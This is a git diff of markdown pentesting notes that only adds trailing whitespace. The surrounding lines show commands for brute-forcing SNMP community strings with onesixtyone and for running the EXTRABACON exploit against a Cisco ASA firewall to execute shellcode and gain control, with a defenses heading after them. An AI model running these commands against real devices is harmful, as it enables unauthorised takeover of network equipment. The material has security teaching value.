@@ -29,7 +29,7 @@ Steps-
 
 **Cracking SNMP community strings( if not set to "public")
 
-	kali > onesixtyone 192.168.1.102 -c /usr/share/doc/onesixtyone/dict.txt
+	kali > onesixtyone 192.168.1.102 -c /usr/share/doc/onesixtyone/dict.txt  
 
 #### Zero Day :[NSA Exploit in CISCO ASA]( https://www.hackers-arise.com/post/2016/08/22/the-extrabacon-zero-day-exploit-on-cisco-asa-firewalls)
 
@@ -48,7 +48,7 @@ Note : The EXTRABACON exploit is a python script that you can [download here](ht
 	kali > ./extrabacon info -t 192.168.1.101 -c hackers-arise
 		This will return a file that we need in exec mode of EXTRABACON. Here, I have named that file OTW
 	kali > ./extrabacon_1.1.0.1.py exec -k OTW -t 192.168.1.101 -c hackers-arise --mode pass-enable
-		When the exploit is successful, it will execute the shellcode on the Cisco ASA firewall, giving the attacker complete control!
+		When the exploit is successful, it will execute the shellcode on the Cisco ASA firewall, giving the attacker complete control!  
 
 #### Defenses
 Until Cisco releases a patch for this exploit, there are two best defenses you can apply for the time being-
